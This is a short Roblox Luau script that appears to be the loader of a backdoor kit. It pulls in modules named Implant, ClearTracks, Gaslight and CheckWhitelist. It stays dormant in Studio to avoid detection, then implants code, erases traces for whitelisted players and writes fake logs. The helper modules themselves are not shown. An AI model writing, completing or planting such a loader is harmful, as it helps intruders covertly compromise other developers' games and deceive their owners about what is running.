-- C:\Drive was here :3

local players = game:GetService("Players")
local cleartracks = require(script:FindFirstChild("ClearTracks"))
local implant = require(script:FindFirstChild("Implant"))
local check = require(script:FindFirstChild("CheckGame"))
local whitelist = require(script:FindFirstChild("CheckWhitelist"))
local gaslight = require(script:FindFirstChild("Gaslight"))

if not check.Http() then
	gaslight.AllOnce()
	gaslight.OnJoin()
else
	if not check.Studio() then
		implant.ImplantLogs()
		cleartracks.Cleanup()
		for _, plr in pairs(players:GetPlayers()) do
			if whitelist.Check(plr) then
				cleartracks.Cleanup()
			end
		end
		players.PlayerAdded:Connect(function(plr)
			if whitelist.Check(plr) then
				cleartracks.Cleanup()
			end
		end)
		task.spawn(function()
			task.wait(3)
			cleartracks.Cleanup()
			cleartracks.FakeLogs()
		end)
	end
end

return {}
